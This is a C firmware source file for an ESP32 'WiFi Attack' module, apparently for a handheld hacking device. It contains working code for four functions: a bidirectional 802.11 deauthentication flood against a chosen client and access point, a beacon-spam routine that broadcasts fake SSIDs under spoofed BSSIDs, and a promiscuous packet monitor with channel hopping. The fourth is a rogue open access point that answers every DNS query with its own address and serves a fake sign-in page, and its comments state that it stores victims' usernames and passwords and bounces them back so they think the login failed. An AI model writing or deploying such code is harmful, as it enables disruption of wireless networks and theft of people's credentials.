/*
 * WiFi Attack — deauth, captive portal, beacon spam, packet monitor
 *
 * All features run autonomously on the ESP32 (no SPI to the M1 during the run).
 * The M1 starts/stops them and pulls results (captured frames, credentials) on
 * demand over the SPI RPC.
 */

#include "wifi_attack.h"
#include "wifi_manager.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "dhcpserver/dhcpserver.h"   /* dhcps_set_captiveportal_uri — RFC 8910 */
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/queue.h"
#include "lwip/sockets.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "wifi_atk";

/* ========== Deauth ========== */

/*
 * IEEE 802.11 Deauthentication frame (26 bytes):
 *   Frame Control: 0x00C0 (deauth)
 *   Duration: 0x0000
 *   Addr1 (DA): target
 *   Addr2 (SA): AP BSSID
 *   Addr3 (BSSID): AP BSSID
 *   Seq Control: 0x0000
 *   Reason Code: 0x0007 (Class 3 frame received from non-associated STA)
 */
static const uint8_t deauth_template[] = {
    0xC0, 0x00,                         /* Frame Control: Deauth */
    0x00, 0x00,                         /* Duration */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* Addr1: DA (target, filled in) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2: SA (AP, filled in) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3: BSSID (AP, filled in) */
    0x00, 0x00,                         /* Sequence Control */
    0x07, 0x00,                         /* Reason: Class 3 */
};

static bool s_deauth_running;
static TaskHandle_t s_deauth_task;
static wifi_attack_deauth_config_t s_deauth_cfg;

static void deauth_task(void *arg)
{
    uint8_t frame[sizeof(deauth_template)];
    memcpy(frame, deauth_template, sizeof(frame));

    /* Fill in addresses */
    memcpy(frame + 4,  s_deauth_cfg.target_mac, 6);  /* DA */
    memcpy(frame + 10, s_deauth_cfg.ap_mac, 6);       /* SA */
    memcpy(frame + 16, s_deauth_cfg.ap_mac, 6);       /* BSSID */

    wifi_mgr_start_monitor(s_deauth_cfg.channel, NULL);

    uint16_t sent = 0;
    while (s_deauth_running) {
        /* Send deauth from AP to target */
        wifi_mgr_send_raw(frame, sizeof(frame));

        /* Also send deauth from target to AP (bidirectional) */
        memcpy(frame + 4,  s_deauth_cfg.ap_mac, 6);
        memcpy(frame + 10, s_deauth_cfg.target_mac, 6);
        wifi_mgr_send_raw(frame, sizeof(frame));

        /* Restore original direction for next iteration */
        memcpy(frame + 4,  s_deauth_cfg.target_mac, 6);
        memcpy(frame + 10, s_deauth_cfg.ap_mac, 6);

        sent++;
        if (s_deauth_cfg.count > 0 && sent >= s_deauth_cfg.count) break;

        vTaskDelay(pdMS_TO_TICKS(s_deauth_cfg.interval_ms > 0 ? s_deauth_cfg.interval_ms : 10));
    }

    wifi_mgr_stop_monitor();
    s_deauth_running = false;
    s_deauth_task = NULL;
    ESP_LOGI(TAG, "Deauth stopped after %u frames", sent);
    vTaskDelete(NULL);
}

esp_err_t wifi_attack_deauth_start(const wifi_attack_deauth_config_t *config)
{
    if (s_deauth_running) return ESP_ERR_INVALID_STATE;
    s_deauth_cfg = *config;
    s_deauth_running = true;

    ESP_LOGI(TAG, "Deauth start: target=" MACSTR " ap=" MACSTR " ch=%d",
             MAC2STR(config->target_mac), MAC2STR(config->ap_mac), config->channel);

    xTaskCreate(deauth_task, "deauth", 4096, NULL, 7, &s_deauth_task);
    return ESP_OK;
}

esp_err_t wifi_attack_deauth_stop(void)
{
    s_deauth_running = false;
    return ESP_OK;
}

bool wifi_attack_deauth_running(void)
{
    return s_deauth_running;
}

/* ========== Captive Portal ========== */

/*
 * Rogue open AP + DNS hijack + HTTP credential-capture page.
 *   - Switches the radio to AP mode (open auth) broadcasting config->ssid; the
 *     previous mode is restored on stop.
 *   - A DNS responder task answers every A query with the AP's own IP
 *     (192.168.4.1), so any hostname the victim's device resolves points here.
 *   - esp_http_server serves the portal page for every GET (which trips the OS
 *     "sign in to network" prompt) and captures username/password on POST.
 */

#define CAPTIVE_MAX_CREDS   32
#define CAPTIVE_AP_IP       "192.168.4.1"

static bool             s_captive_running;
static httpd_handle_t   s_captive_httpd;
static int              s_captive_dns_sock = -1;
static TaskHandle_t     s_captive_dns_task;
static wifi_mode_t      s_captive_prev_mode = WIFI_MODE_STA;
static char             s_captive_title[64];

static SemaphoreHandle_t        s_captive_creds_mtx;
static wifi_attack_credential_t s_captive_creds[CAPTIVE_MAX_CREDS];
static int                      s_captive_cred_count;

/* Live diagnostics so the M1 can see which stage works: DNS queries answered
 * and HTTP page hits since start. s_captive_last_post captures the most recent
 * POST (content-length, bytes read, raw body) so we can see why parsing fails. */
static volatile uint32_t s_captive_dns_q;
static volatile uint32_t s_captive_http_hits;
static char              s_captive_last_post[96];

static void url_decode(const char *src, char *out, size_t out_sz)
{
    size_t o = 0;
    for (size_t i = 0; src[i] && o + 1 < out_sz; i++) {
        if (src[i] == '%' && src[i + 1] && src[i + 2]) {
            char h[3] = { src[i + 1], src[i + 2], 0 };
            out[o++] = (char)strtol(h, NULL, 16);
            i += 2;
        } else if (src[i] == '+') {
            out[o++] = ' ';
        } else {
            out[o++] = src[i];
        }
    }
    out[o] = 0;
}

/* Extract key=value from an application/x-www-form-urlencoded body. */
static bool form_field(const char *body, const char *key, char *out, size_t out_sz)
{
    size_t klen = strlen(key);
    const char *p = body;
    while (p && *p) {
        if (strncmp(p, key, klen) == 0 && p[klen] == '=') {
            const char *v = p + klen + 1;
            const char *end = strchr(v, '&');
            char raw[192];
            size_t n = end ? (size_t)(end - v) : strlen(v);
            if (n >= sizeof(raw)) n = sizeof(raw) - 1;
            memcpy(raw, v, n);
            raw[n] = 0;
            url_decode(raw, out, out_sz);
            return true;
        }
        p = strchr(p, '&');
        if (p) p++;
    }
    return false;
}

static void captive_store(const char *user, const char *pass)
{
    if (!s_captive_creds_mtx) return;
    xSemaphoreTake(s_captive_creds_mtx, portMAX_DELAY);
    if (s_captive_cred_count < CAPTIVE_MAX_CREDS) {
        wifi_attack_credential_t *c = &s_captive_creds[s_captive_cred_count++];
        strlcpy(c->username, user, sizeof(c->username));
        strlcpy(c->password, pass, sizeof(c->password));
        c->timestamp = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS / 1000);
    }
    xSemaphoreGive(s_captive_creds_mtx);
    ESP_LOGW(TAG, "Captured credentials: user='%s'", user);
}

/* Serve the sign-in page as plain chunks (title interpolated) so the OS
 * captive-portal probe trips and shows a login prompt. */
static esp_err_t portal_get_handler(httpd_req_t *req)
{
    s_captive_http_hits++;
    httpd_resp_set_type(req, "text/html");
    httpd_resp_sendstr_chunk(req,
        "<!DOCTYPE html><html><head><meta name=viewport "
        "content='width=device-width,initial-scale=1'><title>");
    httpd_resp_sendstr_chunk(req, s_captive_title);
    httpd_resp_sendstr_chunk(req,
        "</title></head><body style='font-family:sans-serif;max-width:340px;"
        "margin:40px auto;padding:0 16px'><h2>");
    httpd_resp_sendstr_chunk(req, s_captive_title);
    httpd_resp_sendstr_chunk(req,
        "</h2><p>Please sign in to continue.</p>"
        "<form method=GET action=/login>"
        "<p><input name=username placeholder=Email style='width:95%;padding:8px'></p>"
        "<p><input name=password type=password placeholder=Password style='width:95%;padding:8px'></p>"
        "<p><button type=submit style='width:100%;padding:10px'>Sign in</button></p>"
        "</form></body></html>");
    httpd_resp_sendstr_chunk(req, NULL);
    return ESP_OK;
}

static esp_err_t portal_post_handler(httpd_req_t *req)
{
    char body[512];
    int total = req->content_len < (int)sizeof(body) - 1 ? req->content_len
                                                         : (int)sizeof(body) - 1;
    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, body + got, total - got);
        if (r <= 0) {
            if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
            return ESP_FAIL;
        }
        got += r;
    }
    body[got] = 0;

    /* Diagnostic snapshot of the raw request so we can see what the phone sent. */
    snprintf(s_captive_last_post, sizeof(s_captive_last_post),
             "clen=%d got=%d [%.56s]", (int)req->content_len, got, body);

    char user[128] = {0}, pass[128] = {0};
    form_field(body, "username", user, sizeof(user));
    form_field(body, "password", pass, sizeof(pass));
    if (user[0] || pass[0]) captive_store(user, pass);

    /* Bounce back to the form so the victim thinks the login just failed. */
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* Every non-root GET (the OS captive-check probes hit paths like
 * /generate_204, /hotspot-detect.html, /ncsi.txt) gets a 302 to the portal
 * root. Getting a redirect instead of the expected "success" is what makes
 * Android/iOS/Windows decide "captive portal" and auto-open the sign-in view. */
static esp_err_t redirect_handler(httpd_req_t *req)
{
    s_captive_http_hits++;
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://" CAPTIVE_AP_IP "/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* Credential capture via GET query string (?username=..&password=..). Phones'
 * captive mini-browsers handle GET far more reliably than POST bodies, and the
 * query is easy to parse. */
static esp_err_t login_handler(httpd_req_t *req)
{
    s_captive_http_hits++;
    char query[256] = {0};
    char user[128] = {0}, pass[128] = {0};
    esp_err_t qe = httpd_req_get_url_query_str(req, query, sizeof(query));
    if (qe == ESP_OK) {
        char enc[192];
        if (httpd_query_key_value(query, "username", enc, sizeof(enc)) == ESP_OK)
            url_decode(enc, user, sizeof(user));
        if (httpd_query_key_value(query, "password", enc, sizeof(enc)) == ESP_OK)
            url_decode(enc, pass, sizeof(pass));
        if (user[0] || pass[0]) captive_store(user, pass);
    }
    snprintf(s_captive_last_post, sizeof(s_captive_last_post),
             "GET qe=%d [%.52s]", (int)qe, query);

    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* RFC 8908 Captive Portal API endpoint. DHCP option 114 (RFC 8910) points modern
 * OSes here; the JSON tells them a portal exists and where to open it. */
static esp_err_t api_handler(httpd_req_t *req)
{
    s_captive_http_hits++;
    httpd_resp_set_type(req, "application/captive+json");
    httpd_resp_sendstr(req,
        "{\"captive\":true,\"user-portal-url\":\"http://" CAPTIVE_AP_IP "/\"}");
    return ESP_OK;
}

static esp_err_t start_captive_http(void)
{
    httpd_config_t cfg   = HTTPD_DEFAULT_CONFIG();
    cfg.uri_match_fn     = httpd_uri_match_wildcard;
    cfg.max_uri_handlers = 8;
    cfg.lru_purge_enable = true;
    esp_err_t err = httpd_start(&s_captive_httpd, &cfg);
    if (err != ESP_OK) return err;

    httpd_uri_t post = { .uri = "/login", .method = HTTP_POST,
                         .handler = portal_post_handler };
    httpd_register_uri_handler(s_captive_httpd, &post);
    /* Order matters — more specific patterns are checked before the wildcard.
     * "/login" = cred capture (GET), "/api" = RFC 8908, "/" = page, * = 302. */
    httpd_uri_t login = { .uri = "/login", .method = HTTP_GET,
                          .handler = login_handler };
    httpd_register_uri_handler(s_captive_httpd, &login);
    httpd_uri_t api = { .uri = "/api", .method = HTTP_GET,
                        .handler = api_handler };
    httpd_register_uri_handler(s_captive_httpd, &api);
    httpd_uri_t root = { .uri = "/", .method = HTTP_GET,
                         .handler = portal_get_handler };
    httpd_register_uri_handler(s_captive_httpd, &root);
    httpd_uri_t any = { .uri = "/*", .method = HTTP_GET,
                        .handler = redirect_handler };
    httpd_register_uri_handler(s_captive_httpd, &any);
    return ESP_OK;
}

/* Minimal DNS responder: answer every A query with the AP IP. */
static void captive_dns_task(void *arg)
{
    uint8_t buf[512];
    struct sockaddr_in from;
    socklen_t flen = sizeof(from);
    uint32_t ap_ip = ipaddr_addr(CAPTIVE_AP_IP);

    while (s_captive_running && s_captive_dns_sock >= 0) {
        int n = recvfrom(s_captive_dns_sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&from, &flen);
        if (n < 12) continue;
        s_captive_dns_q++;

        buf[2] |= 0x80;                 /* QR = response */
        buf[3] |= 0x80;                 /* RA = recursion available */
        buf[6] = 0x00; buf[7] = 0x01;   /* ANCOUNT = 1 */
        buf[8] = buf[9] = buf[10] = buf[11] = 0;

        int p = n;
        if (p + 16 > (int)sizeof(buf)) continue;
        buf[p++] = 0xC0; buf[p++] = 0x0C;   /* name -> question at offset 12 */
        buf[p++] = 0x00; buf[p++] = 0x01;   /* type A */
        buf[p++] = 0x00; buf[p++] = 0x01;   /* class IN */
        buf[p++] = 0x00; buf[p++] = 0x00;
        buf[p++] = 0x00; buf[p++] = 0x3C;   /* TTL 60s */
        buf[p++] = 0x00; buf[p++] = 0x04;   /* RDLENGTH 4 */
        memcpy(buf + p, &ap_ip, 4); p += 4;

        sendto(s_captive_dns_sock, buf, p, 0, (struct sockaddr *)&from, flen);
    }
    if (s_captive_dns_sock >= 0) { close(s_captive_dns_sock); s_captive_dns_sock = -1; }
    s_captive_dns_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t wifi_attack_captive_start(const wifi_attack_captive_config_t *config)
{
    if (s_captive_running) return ESP_ERR_INVALID_STATE;
    if (!config || config->ssid[0] == 0) return ESP_ERR_INVALID_ARG;

    if (!s_captive_creds_mtx) s_captive_creds_mtx = xSemaphoreCreateMutex();
    s_captive_cred_count = 0;
    s_captive_dns_q      = 0;
    s_captive_http_hits  = 0;
    strlcpy(s_captive_title,
            config->portal_title[0] ? config->portal_title : "Sign In",
            sizeof(s_captive_title));

    /* Switch the radio to a dedicated open AP (restored on stop). */
    esp_wifi_get_mode(&s_captive_prev_mode);
    wifi_config_t ap = {
        .ap = {
            .channel        = config->channel ? config->channel : 1,
            .max_connection = 4,
            .authmode       = WIFI_AUTH_OPEN,
        },
    };
    strlcpy((char *)ap.ap.ssid, config->ssid, sizeof(ap.ap.ssid));
    ap.ap.ssid_len = strlen(config->ssid);
    if (esp_wifi_set_mode(WIFI_MODE_AP) != ESP_OK ||
        esp_wifi_set_config(WIFI_IF_AP, &ap) != ESP_OK) {
        return ESP_ERR_INVALID_STATE;
    }

    /* Let the AP interface finish coming up before touching its DHCP server —
     * configuring DNS synchronously right after set_mode() races the driver's
     * own DHCP startup, which then overwrites our option. */
    vTaskDelay(pdMS_TO_TICKS(500));

    /* Make the AP's DHCP hand out THIS device (192.168.4.1) as the DNS server.
     * Without this, clients get an IP but no DNS -> every lookup fails ("site
     * can't be reached") and the OS captive-check never reaches our page. */
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) {
        esp_netif_dhcps_stop(ap_netif);
        esp_netif_dns_info_t dns = {0};
        dns.ip.type = ESP_IPADDR_TYPE_V4;
        dns.ip.u_addr.ip4.addr = ipaddr_addr(CAPTIVE_AP_IP);
        esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns);
        uint8_t offer_dns = 2;   /* OFFER_DNS bit — advertise DHCP option 6 */
        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
                               ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof(offer_dns));
        /* RFC 8910: advertise the captive-portal API URI (option 114) so modern
         * OSes auto-open the sign-in page. Must be set before DHCP hands leases. */
        dhcps_set_captiveportal_uri("http://" CAPTIVE_AP_IP "/api");
        esp_netif_dhcps_start(ap_netif);
    }

    s_captive_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s_captive_dns_sock >= 0) {
        struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(53),
                                 .sin_addr.s_addr = htonl(INADDR_ANY) };
        if (bind(s_captive_dns_sock, (struct sockaddr *)&a, sizeof(a)) != 0) {
            close(s_captive_dns_sock);
            s_captive_dns_sock = -1;
        }
    }

    s_captive_running = true;
    if (start_captive_http() != ESP_OK) {
        ESP_LOGE(TAG, "Captive HTTP start failed");
        wifi_attack_captive_stop();
        return ESP_FAIL;
    }
    if (s_captive_dns_sock >= 0)
        xTaskCreate(captive_dns_task, "cap_dns", 3072, NULL, 5, &s_captive_dns_task);

    ESP_LOGI(TAG, "Captive portal up: SSID='%s' ch=%d", config->ssid,
             config->channel ? config->channel : 1);
    return ESP_OK;
}

esp_err_t wifi_attack_captive_stop(void)
{
    if (!s_captive_running) return ESP_OK;
    s_captive_running = false;

    dhcps_set_captiveportal_uri(NULL);   /* stop advertising option 114 */
    if (s_captive_httpd) { httpd_stop(s_captive_httpd); s_captive_httpd = NULL; }
    if (s_captive_dns_sock >= 0) {
        int s = s_captive_dns_sock;
        s_captive_dns_sock = -1;
        shutdown(s, SHUT_RDWR); close(s);   /* unblocks the DNS task recvfrom */
    }

    esp_wifi_set_mode(s_captive_prev_mode == WIFI_MODE_NULL ? WIFI_MODE_STA
                                                            : s_captive_prev_mode);
    ESP_LOGI(TAG, "Captive portal stopped (%d creds captured)", s_captive_cred_count);
    return ESP_OK;
}

bool wifi_attack_captive_running(void)
{
    return s_captive_running;
}

int wifi_attack_captive_get_creds(wifi_attack_credential_t *out, int max_count)
{
    if (!out || max_count <= 0 || !s_captive_creds_mtx) return 0;
    xSemaphoreTake(s_captive_creds_mtx, portMAX_DELAY);
    int n = s_captive_cred_count < max_count ? s_captive_cred_count : max_count;
    memcpy(out, s_captive_creds, n * sizeof(wifi_attack_credential_t));
    xSemaphoreGive(s_captive_creds_mtx);
    return n;
}

void wifi_attack_captive_diag(uint32_t *dns_q, uint32_t *http_hits, uint8_t *clients,
                              char *last_post, int last_post_cap)
{
    if (dns_q)     *dns_q     = s_captive_dns_q;
    if (http_hits) *http_hits = s_captive_http_hits;
    if (clients) {
        wifi_sta_list_t list = {0};
        *clients = (esp_wifi_ap_get_sta_list(&list) == ESP_OK) ? (uint8_t)list.num : 0;
    }
    if (last_post && last_post_cap > 0)
        strlcpy(last_post, s_captive_last_post, last_post_cap);
}

/* ========== Beacon Spam ========== */

/*
 * IEEE 802.11 Beacon frame layout (built per-SSID):
 *   MAC header (24 bytes):
 *     Frame Control: 0x0080 (type=mgmt, subtype=beacon)
 *     Duration:      0x0000
 *     Addr1 (DA):    FF:FF:FF:FF:FF:FF (broadcast)
 *     Addr2 (SA):    spoofed BSSID (fixed OUI + per-SSID index)
 *     Addr3 (BSSID): spoofed BSSID (same as Addr2)
 *     Seq Control:   0x0000
 *   Fixed body (12 bytes):
 *     Timestamp(8), Beacon Interval(2 = 0x0064), Capability(2 = 0x0431)
 *   Tagged params:
 *     SSID (id 0), Supported Rates (id 1), DS Parameter Set (id 3, channel)
 */

#define BEACON_MAX_SSIDS 16

static const uint8_t beacon_hdr_template[24] = {
    0x80, 0x00,                         /* Frame Control: Beacon */
    0x00, 0x00,                         /* Duration */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* Addr1: DA (broadcast) */
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, /* Addr2: SA / BSSID (filled per SSID) */
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, /* Addr3: BSSID (filled per SSID) */
    0x00, 0x00,                         /* Sequence Control */
};

/* Fixed 12-byte body: timestamp + beacon interval (0x0064) + capability (0x0431) */
static const uint8_t beacon_fixed[12] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Timestamp */
    0x64, 0x00,                                     /* Beacon Interval (100 TU) */
    0x31, 0x04,                                      /* Capability (ESS, privacy off) */
};

/* Supported Rates tag (id 1): 1,2,5.5,11,6,9,12,18 Mbps */
static const uint8_t beacon_rates[10] = {
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
};

static bool s_beacon_running;
static TaskHandle_t s_beacon_task;
static char s_beacon_ssids[BEACON_MAX_SSIDS][33];
static uint8_t s_beacon_count;
static uint8_t s_beacon_channel;
static uint16_t s_beacon_interval_ms;

static void beacon_task(void *arg)
{
    /* Put the radio on a fixed channel; no association required */
    wifi_mgr_start_monitor(s_beacon_channel, NULL);

    uint8_t frame[128];
    uint16_t seq = 0;

    while (s_beacon_running) {
        for (uint8_t i = 0; i < s_beacon_count && s_beacon_running; i++) {
            size_t p = 0;

            /* MAC header */
            memcpy(frame, beacon_hdr_template, sizeof(beacon_hdr_template));
            /* Unique, stable BSSID per SSID: fixed OUI + index in last byte */
            frame[15] = i;   /* Addr2 last byte */
            frame[21] = i;   /* Addr3 last byte */
            /* Sequence number (12-bit, in upper bits of seq ctrl) */
            frame[22] = (seq << 4) & 0xF0;
            frame[23] = (seq >> 4) & 0xFF;
            seq = (seq + 1) & 0x0FFF;
            p = sizeof(beacon_hdr_template);

            /* Fixed body */
            memcpy(frame + p, beacon_fixed, sizeof(beacon_fixed));
            p += sizeof(beacon_fixed);

            /* SSID tag (id 0) */
            size_t ssid_len = strlen(s_beacon_ssids[i]);
            if (ssid_len > 32) ssid_len = 32;
            frame[p++] = 0x00;
            frame[p++] = (uint8_t)ssid_len;
            memcpy(frame + p, s_beacon_ssids[i], ssid_len);
            p += ssid_len;

            /* Supported Rates tag (id 1) */
            memcpy(frame + p, beacon_rates, sizeof(beacon_rates));
            p += sizeof(beacon_rates);

            /* DS Parameter Set tag (id 3): current channel */
            frame[p++] = 0x03;
            frame[p++] = 0x01;
            frame[p++] = s_beacon_channel;

            wifi_mgr_send_raw(frame, p);

            /* Small delay between SSIDs so all fake APs appear */
            vTaskDelay(pdMS_TO_TICKS(s_beacon_interval_ms > 0 ? s_beacon_interval_ms : 3));
        }
    }

    wifi_mgr_stop_monitor();
    s_beacon_running = false;
    s_beacon_task = NULL;
    ESP_LOGI(TAG, "Beacon spam stopped");
    vTaskDelete(NULL);
}

esp_err_t wifi_attack_beacon_start(const wifi_attack_beacon_config_t *config)
{
    if (s_beacon_running) return ESP_ERR_INVALID_STATE;
    if (config == NULL || config->ssid_count == 0) return ESP_ERR_INVALID_ARG;

    uint8_t n = config->ssid_count;
    if (n > BEACON_MAX_SSIDS) n = BEACON_MAX_SSIDS;

    for (uint8_t i = 0; i < n; i++) {
        strncpy(s_beacon_ssids[i], config->ssids[i], 32);
        s_beacon_ssids[i][32] = '\0';
    }
    s_beacon_count = n;
    s_beacon_channel = config->channel > 0 ? config->channel : 1;
    s_beacon_interval_ms = config->interval_ms;
    s_beacon_running = true;

    ESP_LOGI(TAG, "Beacon spam start: %u SSIDs ch=%d", n, s_beacon_channel);

    xTaskCreate(beacon_task, "beacon", 4096, NULL, 7, &s_beacon_task);
    return ESP_OK;
}

esp_err_t wifi_attack_beacon_stop(void)
{
    s_beacon_running = false;
    return ESP_OK;
}

/* ========== Packet Monitor ========== */

/*
 * Promiscuous capture runs in the Wi-Fi driver's RX context, which must never
 * block. So the RX hook only copies a length-capped frame into a bounded
 * FreeRTOS queue (drop-on-full). The M1 (SPI master) pulls frames from that
 * queue via wifi_attack_monitor_read(); an optional push callback is served by
 * a drain task for local/non-SPI consumers.
 */

#define MON_QUEUE_DEPTH   24
#define MON_FRAME_MAX     256    /* forwarded frame length cap */

typedef struct {
    uint16_t len;
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  data[MON_FRAME_MAX];
} mon_item_t;

static bool                 s_mon_running;
static bool                 s_mon_hopping;
static QueueHandle_t        s_mon_q;
static wifi_attack_pkt_cb_t s_mon_cb;
static TaskHandle_t         s_mon_drain_task;
static TaskHandle_t         s_mon_hop_task;
static volatile uint8_t     s_mon_channel;
static uint16_t             s_mon_hop_dwell_ms;
static volatile uint32_t    s_mon_total;
static volatile uint32_t    s_mon_dropped;

/* Queue backing store + control block live in BSS (no heap alloc, so start can
 * never fail on a fragmented heap). */
static StaticQueue_t s_mon_q_ctrl;
static uint8_t       s_mon_q_store[MON_QUEUE_DEPTH * sizeof(mon_item_t)];

/* Staging item is static (NOT on the stack): the promiscuous callback runs in
 * the single Wi-Fi task, so a 260-byte per-packet stack local would overflow
 * that task's small stack. One static instance is safe (non-reentrant caller). */
static mon_item_t s_mon_staging;

static void mon_promiscuous(const uint8_t *buf, uint32_t len, wifi_pkt_rx_ctrl_t *rx)
{
    if (!s_mon_running || !s_mon_q) return;
    s_mon_staging.len     = len > MON_FRAME_MAX ? MON_FRAME_MAX : (uint16_t)len;
    s_mon_staging.rssi    = rx ? (int8_t)rx->rssi : 0;
    s_mon_staging.channel = s_mon_channel;
    memcpy(s_mon_staging.data, buf, s_mon_staging.len);
    s_mon_total++;
    if (xQueueSend(s_mon_q, &s_mon_staging, 0) != pdTRUE) s_mon_dropped++;
}

static void mon_drain_task(void *arg)
{
    mon_item_t it;
    while (s_mon_running) {
        if (xQueueReceive(s_mon_q, &it, pdMS_TO_TICKS(200)) == pdTRUE && s_mon_cb)
            s_mon_cb(it.data, it.len, it.rssi, it.channel);
    }
    s_mon_drain_task = NULL;
    vTaskDelete(NULL);
}

static void mon_hop_task(void *arg)
{
    uint8_t ch = 1;
    while (s_mon_running && s_mon_hopping) {
        wifi_mgr_set_channel(ch);
        s_mon_channel = ch;
        vTaskDelay(pdMS_TO_TICKS(s_mon_hop_dwell_ms ? s_mon_hop_dwell_ms : 250));
        ch = (ch >= 13) ? 1 : (uint8_t)(ch + 1);
    }
    s_mon_hop_task = NULL;
    vTaskDelete(NULL);
}

static esp_err_t mon_begin(uint8_t channel, wifi_attack_pkt_cb_t cb)
{
    if (s_mon_running) return ESP_ERR_INVALID_STATE;
    if (!s_mon_q) {
        s_mon_q = xQueueCreateStatic(MON_QUEUE_DEPTH, sizeof(mon_item_t),
                                     s_mon_q_store, &s_mon_q_ctrl);
        if (!s_mon_q) return ESP_ERR_NO_MEM;
    } else {
        xQueueReset(s_mon_q);
    }
    s_mon_cb      = cb;
    s_mon_channel = channel ? channel : 1;
    s_mon_total   = 0;
    s_mon_dropped = 0;
    s_mon_running = true;
    esp_err_t err = wifi_mgr_start_monitor(s_mon_channel, mon_promiscuous);
    if (err != ESP_OK) { s_mon_running = false; return err; }
    if (cb) xTaskCreate(mon_drain_task, "mon_drain", 4096, NULL, 6, &s_mon_drain_task);
    return ESP_OK;
}

static esp_err_t mon_end(void)
{
    if (!s_mon_running) return ESP_OK;
    s_mon_running = false;
    s_mon_hopping = false;
    wifi_mgr_stop_monitor();          /* stops further enqueues (clears rx cb) */
    if (s_mon_q) xQueueReset(s_mon_q);
    ESP_LOGI(TAG, "Monitor stopped (total=%lu dropped=%lu)",
             (unsigned long)s_mon_total, (unsigned long)s_mon_dropped);
    return ESP_OK;
}

esp_err_t wifi_attack_monitor_start(uint8_t channel, wifi_attack_pkt_cb_t callback)
{
    s_mon_hopping = false;
    esp_err_t e = mon_begin(channel, callback);
    if (e == ESP_OK) ESP_LOGI(TAG, "Monitor start ch=%d", channel);
    return e;
}

esp_err_t wifi_attack_monitor_stop(void)
{
    return mon_end();
}

esp_err_t wifi_attack_monitor_hop_start(uint16_t dwell_ms, wifi_attack_pkt_cb_t callback)
{
    esp_err_t e = mon_begin(1, callback);
    if (e != ESP_OK) return e;
    s_mon_hop_dwell_ms = dwell_ms;
    s_mon_hopping      = true;
    xTaskCreate(mon_hop_task, "mon_hop", 2560, NULL, 6, &s_mon_hop_task);
    ESP_LOGI(TAG, "Monitor hop start dwell=%ums", dwell_ms);
    return ESP_OK;
}

esp_err_t wifi_attack_monitor_hop_stop(void)
{
    return mon_end();
}

bool wifi_attack_monitor_running(void)
{
    return s_mon_running;
}

uint16_t wifi_attack_monitor_read(uint8_t *out, uint16_t out_cap,
                                  int8_t *rssi, uint8_t *channel)
{
    if (!s_mon_q) return 0;
    mon_item_t it;
    if (xQueueReceive(s_mon_q, &it, 0) != pdTRUE) return 0;
    uint16_t n = it.len < out_cap ? it.len : out_cap;
    memcpy(out, it.data, n);
    if (rssi)    *rssi = it.rssi;
    if (channel) *channel = it.channel;
    return n;
}

void wifi_attack_monitor_stats(uint32_t *total, uint32_t *dropped, uint8_t *buffered)
{
    if (total)    *total    = s_mon_total;
    if (dropped)  *dropped  = s_mon_dropped;
    if (buffered) *buffered = s_mon_q ? (uint8_t)uxQueueMessagesWaiting(s_mon_q) : 0;
}
